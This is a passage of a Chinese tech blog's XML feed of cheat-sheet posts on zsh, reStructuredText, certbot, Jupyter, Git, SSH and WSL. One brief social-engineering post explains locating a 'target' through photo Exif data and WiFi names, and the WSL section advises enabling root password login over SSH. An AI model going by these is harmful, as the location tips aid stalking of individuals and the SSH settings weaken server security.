$&#123;ZSH_CUSTOM:-~/.oh-my-zsh/custom&#125;/plugins/zsh-syntax-highlighting 当安装并启用以上的所有插件后，$HOME/.zshrc文件中插件相关配置应该是下面这样的：123456789101112plugins=( git autojump zsh-autosuggestions zsh-completions zsh-syntax-highlighting)source $ZSH/oh-my-zsh.shsource ~/.oh-my-zsh/custom/plugins/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh# 值得注意的是，根据官方文档，zsh-syntax-highlighting插件需放在最后，# 并且要加上相应的source语句 尾巴Oh My Zsh自带了很多主题，在这里可以查看每个主题的显示效果，可根据自己的喜好选择合适的主题，值得注意的是，当在$HOME/.zshrc配置文件中将主题设置为random时，它每次会选择随机的主题。]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[reStructuredText小记]]></title>
    <url>%2F2018%2F09%2F17%2Frestructuredtext%2F</url>
    <content type="text"><![CDATA[reStructuredText是一种类似于Markdown的轻量标记语言，其含义为“重新构建的文本”，也被简称为reST，文件后缀名为.rst，是Python的Docutils项目的一部分，目前reST被广泛应用于编写Python文档。 基本语法标题12345678这是一级标题============这是二级标题------------这是三级标题************ reST使用这种不同的下标表示标题的大小，你可以按照自己的喜好使用不同的下标表示不同的标题，总之，一片文档中从上往下依次出现的第一种下标就表示一级标题，第二种不同于之前出现过的下标就表示二级标题，依次类推，个人喜欢用上面这种形式。 列表和Markdown一样：1234567- 无序列表项- 无序列表项- 无序列表项1. 有序列表项2. 有序列表项3. 有序列表项 链接1`Howie&apos;s Blog &lt;http://howiezhao.com&gt;`_ 横线1---- 这是一条水平区分线，用4个或以上的短横线表示 转义和传统编程语言一样，reST使用\转义特殊字符。 注释注释以两个点和一个空格开始。如下：1.. 这是一行注释 Interpreted Text RolesInterpreted Text Roles（直译为“解释文本角色”）是reST中非常重要的一个概念，Interpreted Text（解释文本）是指以两个`包裹起来的文本，Role（角色）是指解释文本的显示规则。Interpreted Text的语法为:role:`text`或`text`:role:，功能是根据role规则对text进行Interprete（解释）。 字体和Markdown一样：12*斜体*，等价于 :emphasis:`斜体`**粗体**，等价于 :strong:`粗体` 单行代码1``这里是单行代码``，等价于:literal:`这里是单行代码` DirectivesDirectives（直译为“指令”）是reST中另一个非常重要的概念，指令具有如下语法：12345+-------+-------------------------------+| &quot;.. &quot; | directive type &quot;::&quot; directive |+-------+ block | | | +-------------------------------+ 指令以明确的标记开始（两个句点和一个空格），后跟指令类型和两个冒号（统称为“指令标记”）。指令块在指令标记之后立即开始，并包括所有后续的缩进行。指令块分为参数，选项（字段列表）和内容（按此顺序），其中任何一个都可能出现。 多行代码1234.. code:: python def my_function(): print(&quot;hello&quot;) 图片12.. image:: picture.png :alt: 当图片无法显示时，则显示这里的语句。 表格引用最佳实践 在特殊字符与要书写的文字之间加上空格，否则可能无法正常显示 不同段之间加一空行 解析器与Markdown相比更多这里有一个在线的reST编辑器。 要了解更多关于reST的知识可参考Docutils官方文档，或者Sphinx官方文档。]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[使用Let's Encrypt获取免费SSL证书]]></title>
    <url>%2F2018%2F09%2F16%2Flet-s-encrypt%2F</url>
    <content type="text"><![CDATA[Let’s Encrypt是一个免费、自动化和开放的证书颁发机构，它提供了一个工具：Certbot，可以用来获取SSL证书。进入Certbot的官网，根据自己的环境选择Web服务器和操作系统，即可得到详细的操作步骤，下面以Nginx Web服务器和CentOS 6操作系统为例，给出相关步骤： 安装12345# 下载certbot-auto脚本wget https://dl.eff.org/certbot-auto# 配置相关权限chmod a+x certbot-auto 配置请注意，获取或更新SSL证书之前需关闭相应的Web服务器，具体而言，需要执行service nginx stop。另外，第一次执行certbot-auto命令时，它会下载并安装相关环境，耐心等待即可。Certbot提供了一个Nginx插件，直接使用./certbot-auto --nginx即可完成所有配置。如果你想手动配置，可执行./certbot-auto certonly --standalone命令，此命令运行过程中会要求用户输入要获取SSl证书的域名，按要求输入即可，命令运行成功后会显示证书相关文件所在的目录。接下来只需在Nginx的配置文件nginx.conf中进行如下配置即可(以howiezhao.com域名为例)：123ssl on;ssl_certificate /etc/letsencrypt/live/howiezhao.com/fullchain.pem;ssl_certificate_key /etc/letsencrypt/live/howiezhao.com/privkey.pem; 更新Let’s Encrypt的证书默认时间为90天，当到期后，需要使用./certbot-auto renew命令进行证书更新。 更多要查看certbot-auto的更多命令，可以使用certbot-auto --help all命令查看之。要了解SSL的详细知识，可参考我之前写的笔记HTTPS运行机制。要了解Nginx的相关知识，可参考我之前写的笔记利用Nginx进行反向代理。]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[库与框架]]></title>
    <url>%2F2018%2F09%2F16%2Flibrary-framework%2F</url>
    <content type="text"><![CDATA[软件开发中经常会有人混淆库与框架的含义，下面简单介绍之：库(library)是一个工具集，它不告诉你应该怎么做事，它只告诉你它能干什么事，具体干什么事，取决于使用者，比如，jQuery、Servlet等是一个个的库。库的优点是自由度高，可定制性强，较适用于小项目。框架(framework)制定了一系列的规则，限定了你的行动，你必须遵循它制定的规则行事，但它却可以极大方便你的开发，比如，Angular、Spring等是一个个的框架。框架的优点是流程性高，便于开发，较适用于大项目。通常，我们把库也称为类库(class library)，这也从另一个方面反映了库中包含的主要是类，类似的，框架中也主要包含类，据此，我们可以把程序员分为类创建者和客户端程序员，客户端程序员通过调用其类来使用库或框架。]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[使用IPython替代原生Python Shell]]></title>
    <url>%2F2018%2F09%2F16%2Fipython%2F</url>
    <content type="text"><![CDATA[我算是个原教主义者，喜欢原生的东西，不太喜欢第三方的东西，但IPython相比原生Python Shell的众多优秀特性，让我不由得使用上它。 名称IPython最初只是一种基于Python的交互式解释器(REPL)，慢慢的，IPython项目中集成了许多新的工具，比如IPython Notebook，这是一种基于Web的强大编辑器。从IPython 4.0开始，IPython项目中和语言无关的工具已独立出来形成一个新的项目Jupyter，从此，IPython Notebook升级为Jupyter Notebook，开始支持更多的编程语言。而IPython将只专注于提供Python交互式解释器以及为Jupyter提供Python内核。当写这篇文章时，IPython的最新版本为6.5。如今，当你去IPython官网下载时，它会跳转到Jupyter的下载页面，因为Jupyter中已经包含了IPython，同时也建议下载Jupyter，因为其包含了强大的Jupyter Notebook，使用pip install jupyter即可下载，安装完成后直接输入ipython即可进入IPython交互式环境。 优势以下仅列出IPython相比原生Python Shell的一些优势： Tab自动补全 自动缩进 语法高亮 支持命令历史记录 命令前加!可调用系统命令 命令后加1个或2个?可方便查看对象信息 有众多的魔法函数(Magic Functions) 魔法函数以下仅列出IPython中使用较多的魔法函数：12345%timeit #测试代码段执行时间%hist #查看历史记录%debug #激活交互的调试器(ipdb)%load #加载外部代码%edit #使用编辑器打开 要查看更多的魔法函数，可以访问IPython的官方文档 Jupyter Notebook要启动Jupyter Notebook直接在命令行输入jupyter notebook即可，它会监听本机的8888端口，并自动打开浏览器访问。输入jupyter notebook --help可以查看它的更多参数。Jupyter Notebook默认采用Token的方式进行登录，启动后在命令行中会显示当前的token值，若没有自动打开浏览器，则可以复制命令行中带token的链接并在浏览器中打开即可。使用命令jupyter notebook --generate-config可生成Jupyter Notebook配置文件，默认为$HOME/.jupyter/jupyter_notebook_config.py文件。常用的配置项如下：12345678910111213141516171819# 配置是否允许root用户运行，改为`True`则允许c.NotebookApp.allow_root = False# 配置监听地址，改为`*`可监听所有IPc.NotebookApp.ip = 'localhost'# 配置启动后显示的目录，默认为启动时输入命令的目录c.NotebookApp.notebook_dir = ''# 配置启动时是否自动打开浏览器，若在远程服务器上启动Jupyter Notebook，# 则没必要打开浏览器，改为`False`即可c.NotebookApp.open_browser = True# 配置登录密码，需要存储密文形式，使用`jupyter notebook password`命令# 可生成加密后的密码c.NotebookApp.password = ''# 配置监听端口c.NotebookApp.port = 8888 最后，在Linux下，使用nohup jupyter notebook &gt; jupyter.log &amp;可使Jupyter Notebook在后台运行并记录日志到当前目录下的jupyter.log文件中。]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[前端相关术语]]></title>
    <url>%2F2018%2F09%2F14%2Ffront-end-terminology%2F</url>
    <content type="text"><![CDATA[轮播图轮播图，在Bootstrap中又被称为Carousel，是当今网站主页非常常用的一种动态效果。 视差滚动视差滚动，又称Parallax Scrolling，指让多层背景以不同的速度移动，形成立体的运动效果，带来非常出色的视觉体验。 ToolTipToolTip，在Bootstrap 4 中又被称为提示冒泡。 手风琴效果手风琴效果，又被称为Accordion。 哈林摇哈林摇，又称Harlem Shake。 响应式布局响应式布局，又称Responsive Layout，即一个布局可以适应多个不同终端。]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[网站的WWW问题]]></title>
    <url>%2F2018%2F09%2F12%2Fweb-www%2F</url>
    <content type="text"></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[LaTeX小记]]></title>
    <url>%2F2018%2F09%2F12%2Flatex%2F</url>
    <content type="text"><![CDATA[TeX与LaTeXTeX是由Donald Knuth开发的一个排版系统，特别适合处理复杂的数学公式等。之后，Leslie Lamport改进了TeX，形成了LaTeX(Lamport TeX)。 安装更多MathJax是一个JavaScript引擎，可以用来在网页上显示使用LaTeX语言书写的数学公式。在线LaTeX公式编辑器是一个将公式符号转化为LaTeX语言的网站，对于尚不熟悉的人书写LaTeX公式提供一点便利。ShareLaTeX是一个在线的LaTeX编辑环境，同时也提供了足够多的LaTeX模板。]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[辗转相除法]]></title>
    <url>%2F2018%2F09%2F12%2Feuclidean%2F</url>
    <content type="text"></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[IRC是什么]]></title>
    <url>%2F2018%2F09%2F12%2Fwhat-is-irc%2F</url>
    <content type="text"><![CDATA[IRC，全称Internet Relay Chat，即因特网中继聊天，是早期经常使用的网络聊天方式，其主要用于群体聊天，但同样也可以用于个人对个人的聊天。IRC协议属于应用层协议，使用的传输层协议为TCP，使用的端口为6667(明文传输，如irc://chat.freenode.net)或6697(SSL加密传输，如ircs://chat.freenode.net:6697)。IRC是一个分布式的C/S架构，一个IRC服务器可以连接其他的IRC服务器以扩展为一个IRC网络，通过连接到一个IRC服务器，我们可以访问这个服务器以及它所连接的其他服务器上的频道，频道存在于一个IRC服务器上，一个频道类似于一个聊天室，频道名称必须以#符号开始，例如#irchelp。大多数的IRC服务器不需要客户注册登录，虽然在连接前必须设定好昵称（nickname），但客户端一般都会自动分配一个。目前使用最广的IRC服务器为freenode，而IRC客户端软件有多种，比如基于Firefox浏览器的IRC插件ChatZilla，基于网页的Webchat，基于命令行的Irssi等等。个人经常使用的IRC客户端为Irssi，在Ubuntu中可以使用apt install irssi安装，之后直接输入irssi即可启动，输入irssi --help可查看更多命令参数。启动irssi后可输入更多的命令，输入/help可查看所有可用命令，输入/connect Freenode即可连接到freenode服务器，之后再输入/join #linuxba即可加入#linuxba频道。这里需要注意，freenode服务器由于种种原因，在国内无法访问，而irssi又不支持代理，所以推荐使用proxychains代理irssi。最后，值得推荐的IRC频道有下(基于freenode)： #ubuntu-cn：Ubuntu中文社区频道 #archlinux-cn：Arch Linux中文社区频道 #linuxba：Linux贴吧频道 #haskell：Haskell语言频道 #vim：Vim社区频道]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>计算机网络</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ifconfig与ip]]></title>
    <url>%2F2018%2F09%2F12%2Fifconfig-ip%2F</url>
    <content type="text"></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[巴科斯范式]]></title>
    <url>%2F2018%2F09%2F12%2Fbnf%2F</url>
    <content type="text"></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[基于人的信息收集]]></title>
    <url>%2F2018%2F09%2F09%2Fhuman-based-information-gathering%2F</url>
    <content type="text"><![CDATA[照片根据目标朋友圈、微博等社交网络所发的照片，查看Exif信息，可得到目标当时的位置、相机规格等信息。 WiFi根据目标所连接的WiFi名称可大致判断目标所在的位置，多数情况下，WiFi的名称一般为所在旅馆、餐馆、机构等名称的缩写。]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>社会工程学</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Docker入坑指南]]></title>
    <url>%2F2018%2F08%2F31%2Fdocker%2F</url>
    <content type="text"><![CDATA[Docker是一种基于Linux的容器化技术，类似于轻量的虚拟机。它采用C/S架构，使用Go语言开发。 版本Docker分为2个版本：社区版(Community Edition, CE)和企业版(Enterprise Edition, EE)，顾名思义，企业版是收费的。针对macOS10.10.3和Windows 10，Docker还推出了Docker Desktop，Docker Desktop又分为2个渠道(channel)，稳定渠道(Stable)和抢先渠道(Edge)，需要注意的是，Docker Desktop对系统是有要求的，例如，针对Win10的Docker for Windows因为要用到Hyper-V虚拟机，所以要求系统是64位专业版或企业版并开启Hyper-V功能。针对老版本的Windows或macOS，可以使用Docker Toolbox，它会附带安装一个VirtualBox虚拟机。使用docker version可以查看docker版本，直接输入docker可以查看docker相关命令。 镜像镜像(image)文件可以用来生成容器实例，其类似于在虚拟机中安装操作系统时所使用的ISO镜像。image文件可以包含一个tag(标签)，即版本号。你可以使用远程仓库中别人制作好的image文件，也可以自己制作image文件。要制作image文件就要编写Dockerfile文件，其类似于Makefile文件image的常用命令如下：12345678910111213141516# 列出本机的所有image文件docker image lsdocker images# 删除指定的image文件docker image rm [image-name]docker rmi [image-name]# 将指定的image文件从远程仓库拉取到本地docker image pull [image-name]docker pull [image-name]# 利用当前文件夹中的Dockerfile制作一个名为demo、tag为0.0.1的image文件# 若不指定tag，则默认的标签为latestdocker image build -t demo:0.0.1 .docker build -t demo:0.0.1 . 容器image文件生成的容器(container)实例，本身也是一个文件，称为容器文件。当关闭容器时，并不会删除容器文件，只是容器停止运行而已。类似于在虚拟机中安装的操作系统，其本身会在硬盘中创建一系列文件，当关闭操作系统时，相应的文件并不会删除。container的常用命令如下：123456789101112131415# 从指定的image文件生成一个正在运行的容器实例，# 若本地没有指定的image文件，会从远程仓库中自动抓取下来docker container run [image-name]docker run [image-name]# 列出本机正在运行的容器，使用参数`-all`列出所有容器文件docker container ls# 删除指定的容器文件docker container rm [container-id]docker rm [container-id]# 关闭指定的容器实例docker container kill [container-id]docker kill [container-id] 仓库仓库(repository)是不同标签的image的集合，注册处(registry)又是不同仓库的集合，Docker的官方Registry是Docker Hub，类似于GitHub。使用docker login可以登录到自己在Docker Hub上注册的帐号。值得注意的是，国内访问Docker Hub速度较慢，建议设置代理或使用国内镜像站。一般来说，国内镜像站只包含流行的公有镜像，私有镜像仍需要从Docker Hub中拉取。]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Git小记]]></title>
    <url>%2F2018%2F08%2F31%2Fgit%2F</url>
    <content type="text"><![CDATA[Git是目前最流行的分布式版本控制系统（Distributed Version Control System, DVCS），类似的工具还有Mercurial（由hg命令操作）等；在早期，人们常使用集中式版本控制系统（Centralized Version Control System，CVCS），其典型有CVS、Subversion（SVN）等；现在，越来越多的人开始使用更为优秀的分布式版本控制系统，所谓版本控制，即可以随时记录并切换文件的不同版本。 安装配置Git共有3个配置文件，分别是： /etc/gitconfig文件用于配置所有用户的配置信息，使用git config --system命令配置 某个用户家目录下的.gitconfig文件只适用于该用户，使用git config --global命令配置 当前Git仓库的.git/config仅针对当前项目，直接使用git config命令进行配置 注意：每一个级别会覆盖上一级别的配置，所以.git/config的配置变量会覆盖/etc/gitconfig中的配置变量。按照个人偏好，针对新安装的Git环境，会配置如下信息：12345678910111213141516171819202122# 配置提交时使用的用户名和邮箱，必须配置git config --global user.email "you@example.com"git config --global user.name "Your Name"# 开启颜色显示git config --global color.ui true# 配置别名git config --global alias.lg1 "log --graph --abbrev-commit --decorate --format=format:'%C(bold blue)%h%C(reset) - %C(bold green)(%ar)%C(reset) %C(white)%s%C(reset) %C(dim white)- %an%C(reset)%C(bold yellow)%d%C(reset)' --all"git config --global alias.lg2 "log --graph --abbrev-commit --decorate --format=format:'%C(bold blue)%h%C(reset) - %C(bold cyan)%aD%C(reset) %C(bold green)(%ar)%C(reset)%C(bold yellow)%d%C(reset)%n'' %C(white)%s%C(reset) %C(dim white)- %an%C(reset)' --all"git config --global alias.lg '!"git lg1"'git config --global alias.adog "log --all --decorate --oneline --graph"# 配置difftool为Meld（Windows）git config --global diff.tool meldgit config --global difftool.meld.path "C:\Program Files (x86)\Meld\Meld.exe"git config --global difftool.prompt false# 配置mergetool为Meld（Windows）git config --global merge.tool meldgit config --global mergetool.meld.path "C:\Program Files (x86)\Meld\Meld.exe"git config --global mergetool.prompt false 另外，Git默认使用的编辑器是Vim，若要配置成自己喜欢的编辑器(如Emacs)，可使用命令：git config --global core.editor emacs。最后，你可以使用git config --list来查看所有配置信息。 结构要开始对某个项目进行版本控制，需要先在其所在路径下执行git init进行初始化，此命令会在当前路径下创建一个.git的隐藏文件夹，这就是Git仓库目录。Git分为3个区域，Git仓库、工作目录、暂存区域： Git仓库目录（Repository）是Git用来保存项目的元数据和对象数据库的地方。这是Git中最重要的部分，从其它计算机克隆仓库时，拷贝的就是这里的数据。 工作目录（Working directory）是对项目的某个版本独立提取出来的内容。这些从Git仓库的压缩数据库中提取出来的文件，放在磁盘上供你使用或修改。 暂存区域（Staging area）是一个文件，保存了下次将提交（commit）的文件列表信息，一般在Git仓库目录中。有时候也被称作“索引”，不过一般说法还是叫暂存区域。 基本的Git工作流程如下： 在工作目录中修改文件。 暂存文件，将文件的快照放入暂存区域。 提交更新，找到暂存区域的文件，将快照永久性存储到Git仓库目录。 根据Git的三个区域，一个文件可以有如下几种状态： 未跟踪状态（untracked）：指新创建且还没有添加到暂存区域的文件 已暂存状态（staged）：指已经添加到暂存区域的文件 已提交状态（committed）：指已经从暂存区提交到Git仓库的文件 已修改状态（modified）：指作了修改但还没有放到暂存区域的文件 分支每一次提交都是文件的一个版本，可以将这一系列提交看作一条链表，链表的头指针（HEAD）始终指向最新的提交，即最新的版本。要检出到某一版本，本质上是将HEAD指针指向某一提交。链表中的节点（即提交）都有唯一的父节点和唯一的子节点，Git中分支（branch）的本质就是将链表变为树。当使用git init初始化Git仓库时，会默认创建master分支，这种一个分支等价于一条链表。使用git branch可列出所有分支，使用git branch dev即可在当前提交点创建新分支dev，接着使用git checkout dev即可切换到dev分支，或者直接使用git checkout -b dev即可一步创建并切换到dev新分支。 命令 git version：查看Git版本信息 git add test1.txt：将需要被追踪的文件（test1.txt）添加到暂存区域 git reset test2.txt：将误被追踪的文件（test2.txt）移除出暂存区域，文件仍会存在于工作目录 git commit -m &#39;first commit&#39;：将暂存区域的内容提交到本地仓库，参数-m指定提交时的附带信息，若不带参数-m执行此命令则会自动打开默认的Vim编辑器并要求输入附带信息 git push：将本地仓库推送到远程仓库 git clone：将远程仓库克隆到本地 git pull：将远程仓库的更新拉取到本地仓库 git status：查看Git仓库状态 git log：查看commit记录，参数--graph可以图形化显示，参数--oneline可以一行显示。 git diff：对比工作目录和暂存区域中文件之间的不同 git diff --staged：对比暂存区域和Git仓库中最新commit文件之间的不同 git diff &lt;first-commit-id&gt; &lt;second-commit-id&gt;：对比Git仓库中两个commit之间的不同，参数为两个commit ID，为方便可以取ID的前7个字符 git checkout &lt;commit-id&gt;：切换到某个具体的commit，要切换回最新的commit可使用git checkout master .gitignore思想直接记录快照，而非差异比较：Git与其他版本控制系统的主要区别在于对待数据的方法，其他的VCS主要记录不同版本之间的差异，而Git则相当于直接记录不同版本的快照。近乎所有操作都是本地执行：在Git中的绝大多数操作都只需要访问本地文件和资源，一般不需要来自网络上其它计算机的信息。Git保证完整性：Git中所有数据在存储前都计算校验和(SHA-1)，然后以校验和来引用。这意味着不可能在Git不知情时更改任何文件内容或目录内容。若你在传送过程中丢失信息或损坏文件，Git就能发现。Git一般只添加数据：你执行的Git操作，几乎只往Git数据库中增加数据。很难让Git执行任何不可逆操作，或者让它以任何方式清除数据。 原理GitHub应明确一点，Git是由Linux创始人Linus Torvalds开发的分布式版本控制系统，而GitHub是使用Git实现的代码托管网站，两者并非一类。 更多在命令行中直接输入git，可查看相关命令，要具体查看某个命令的帮助信息，可输入git help &lt;command&gt;，如git help diff，要了解更多关于Git的内容，可以参考《Pro Git》一书。]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[telnet协议分析]]></title>
    <url>%2F2018%2F08%2F24%2Ftelnet%2F</url>
    <content type="text"></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>计算机网络</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SSH协议分析]]></title>
    <url>%2F2018%2F08%2F24%2Fssh%2F</url>
    <content type="text"><![CDATA[SSH(Secure Shell)即安全外壳协议，是一种位于应用层的加密的网络传输协议，虽然任何网络服务都可以通过SSH实现安全传输，但其最常见的用途还是远程登录，是Telnet等非安全Shell的替代品。 OpenSSH的运行机制SSH是一种协议，其实现多种多样，目前使用最广泛的实现是OpenSSH项目。当使用ssh user@host命令进行登录时，所完成的整个过程如下： 远程主机收到用户的登录请求，把自己的公钥发给用户 用户使用这个公钥，将登录密码加密后，发送给远程主机 远程主机用自己的私钥，解密登录密码，若密码正确，则同意用户登录 后续过程中，用户发送的信息都采用此方式进行加密发送 因为不像HTTPS协议，SSH协议的公钥是没有证书中心(CA)公证的，所以为了防止中间人攻击，当用户第一次登录远程主机时，系统会提示如下信息：123The authenticity of host 'host (12.18.429.21)' can't be established.RSA key fingerprint is 98:2e:d7:e0:de:9f:ac:67:28:c2:42:2d:37:16:58:4d.Are you sure you want to continue connecting (yes/no)? 即系统无法确认远程主机的真实性(远程主机有可能是中间人)，只知道远程主机的公钥指纹，询问用户是否继续连接。公钥指纹就是对公钥进行哈希计算得到的，为了方便用户的比较。用户并没有什么好的办法得知自己想要连接的真实远程主机的公钥指纹，一个可行的办法是远程主机在其官方网站上贴出自己的公钥指纹，方便用户和系统提示的指纹进行比较。 假定当用户进行风险衡量后决定继续连接，接下来的过程就如上述提到的一样。远程主机的公钥会被保存在$HOME/.ssh/known_hosts文件中，当用户下次再连接时，系统就会认出它的公钥已经保存在本地了，从而跳过警告部分，直接提示输入密码。 除了采用口令登录外，还可使用公钥登录，原理为：用户将自己的公钥储存在远程主机上，登录时，远程主机会向用户发送一段随机字符串，用户用自己的私钥加密后，再发回来，远程主机用事先储存的公钥进行解密，如果成功，就证明用户是可信的，直接允许登录shell，不再要求密码。 OpenSSH提供了一个工具 —— ssh-keygen，使用它可以方便的生成一对公私钥，生成的公钥为id_rsa.pub，私钥为id_rsa，保存在$HOME/.ssh目录下，当然你可以使用-t（type）参数指定密钥的类型（默认生成类型为RSA），使用-f（file）参数指定生成的目录文件名，使用-C（Comment）参数指定注释，更多的参数可以使用--help参数查看。 生成的公钥格式为&lt;protocol&gt; &lt;key-blob&gt; &lt;comment&gt;，其中注释项通常用来指代要登录的用户名。 有了密钥对后，可以使用ssh-copy-id user@host命令将自己的公钥上传至远程主机，远程主机会将用户的公钥，保存在登录后的用户主目录的$HOME/.ssh/authorized_keys文件中。实际上，ssh-copy-id命令的整个过程就如下命令一样：1ssh user@host 'mkdir -p .ssh &amp;&amp; cat &gt;&gt; .ssh/authorized_keys' &lt; ~/.ssh/id_rsa.pub 实际上，ssh-copy-id还会对创建的文件及文件夹进行相关的权限设置，这里不过多介绍。 最后还要对远程主机的SSH服务端配置文件，即/etc/ssh/sshd_config文件进行相关配置，并重启SSH服务即可生效。具体而言，涉及到的配置项如下：123RSAAuthentication yesPubkeyAuthentication yesAuthorizedKeysFile .ssh/authorized_keys 紧接着使用service sshd restart重启SSH服务。 快速登录$HOME/.ssh目录下的config文件可配置快速登录选项，若没有，可以新建一个，具体而言，如下：12345host aliyun user howie hostname 192.168.0.41 port 22 identityfile ~/.ssh/id_rsa 这代表当输入ssh aliyun时，其默认执行ssh howie@192.168.0.41 -p 22 -i ~/.ssh/id_rsa。当有多个别名需要设置时，其中间要空上一行。 常见问题使用密钥连接后仍然需要输入登录密码：这种情况一般是由于密钥登录失败所导致的，请检查$HOME/.ssh目录是否为700权限，$HOME/.ssh/authorized_keys文件是否为600权限，除此之外的其他权限均不能成功。]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>计算机网络</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[WSL相关问题解决]]></title>
    <url>%2F2018%2F08%2F21%2Fwsl-problem%2F</url>
    <content type="text"><![CDATA[名称问题最早这个项目命名为Bash on Ubuntu on Windows，随后改名为Windows Subsystem for Linux，即WSL，值得肯定的是，随着Windows 10逐渐更新，慢慢统一了命名。 安装及运行在安装前，需要在启动或关闭Windows功能中勾选适用于Linux的Windows子系统，或者直接在管理员权限的PowerShell中输入Enable-WindowsOptionalFeature -Online -FeatureName Microsoft-Windows-Subsystem-Linux此条命令，也能达到同样的效果。完成上述操作后，可直接在Microsoft Store中搜索Linux，到本文书写为止，商店中已经有Ubuntu、SUSE、Debian、Kali等Linux发行版，个人建议下载Ubuntu。到Ubuntu的下载页，可以看到发布者为Canonical公司，这也正是Ubuntu的维护公司，值得注意的是，Canonical公司还发布了特定版本的Ubuntu系统，例如Ubuntu 16.04 LTS、Ubuntu 18.04 LTS等，个人建议直接下载无版本号的Ubuntu，而不要下载特定版本的Ubuntu，因为无版本号的Ubuntu会在新版本Ubuntu发布之后切换到最新版，所以它始终指向最新的Ubuntu。同时请注意，应用商店里Ubuntu软件的更新并不会升级Ubuntu版本，如果你恰好安装的是旧版本，想要升级到新版本，可以在WSL中运行do-release-upgrade命令升级到最新版。下载完成后，要启动Ubuntu有多种方式，可以在PowerShell或cmd中输入wsl或bash或ubuntu都可启动，也可以直接在开始菜单中点击Ubuntu图标启动。 SSH问题要想在WSL中开启SSH服务，需要在配置文件(/etc/ssh/sshd_config)中作如下修改：12345Port 2222 #将22改为2222，因Win10中自带的SSH服务也在监听22端口ListenAddress 0.0.0.0 #取消注释，监听所有端口UsePrivilegeSeparation no #将yes修改为noPermitRootLogin yes #将prohibit-password修改为yes，允许root用户登录，视个人情况而定PasswordAuthentication yes #将no修改为yes，允许密码登录 修改完成后用sudo service ssh start启动SSH服务，可能会报如下错误：1234Could not load host key: /etc/ssh/ssh_host_rsa_keyCould not load host key: /etc/ssh/ssh_host_dsa_keyCould not load host key: /etc/ssh/ssh_host_ecdsa_keyCould not load host key: /etc/ssh/ssh_host_ed25519_key 并且此时无法使用SSH客户端连接到服务器端，客户端会报如下错误：1Connection closed by 127.0.0.1 port 2222 造成这种情况的原因是服务端在启动SSH服务时发现加密过程中需要用到的密钥文件未找到，可依次用如下命令生成所需文件：1234ssh-keygen -t rsa -f /etc/ssh/ssh_host_rsa_keyssh-keygen -t dsa -f /etc/ssh/ssh_host_dsa_keyssh-keygen -t ecdsa -f /etc/ssh/ssh_host_ecdsa_keyssh-keygen -t ed25519 -f /etc/ssh/ssh_host_ed25519_key 其中-t参数表示加密类型，-f参数表示生成的密钥文件名，错误信息中缺少什么密钥按需生成即可。之后再重新启动SSH服务即可正常工作。 图形界面问题在你当前所使用的shell的配置文件里（比如.bashrc或.zshrc），添加如下命令：1export DISPLAY=localhost:0 随后打开X Server客户端（比如Xming或VcXsrv）并将Display项设为0即可运行图形化应用。笔者所使用的是MobaXterm，其设置路径为Settings —&gt; Configuration —&gt; X11 —&gt; Display offset。 EXE程序问题netstat和ps后台运行问题更多有关WSL的更多内容，可以查看WSL官方文档，或者WSL官方博客，在使用WSL的过程中遇到任何问题，可以去WSL的GitHub地址提Issues。]]></content>
      <categories>
        <category>Bug</category>
      </categories>
      <tags>
        <tag>Windows</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Android Studio模拟器相关问题解决]]></title>
    <url>%2F2018%2F08%2F21%2Fandroid-emulator-problem%2F</url>
    <content type="text"><![CDATA[网络问题 命令行启动Android SDK工具包中包含着一个模拟器的命令行程序 —— emulator，它可以在不启动Android Studio的情况下开启Android模拟器，在Windows系统中，emulator位于%LOCALAPPDATA%\Android\Sdk\tools文件夹下，emulator -list-avds命令可以列出所有已创建的AVD，emulator -avd &lt;avd-name&gt;命令即可启动相应的AVD，要查看emulator更多的参数，可以使用emulator -help。 最佳实践建议创建的AVD为Pixel，版本为Android 7.1.1。]]></content>
      <categories>
        <category>Bug</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Hyper-V相关问题解决]]></title>
    <url>%2F2018%2F08%2F20%2Fhyper-v-problem%2F</url>
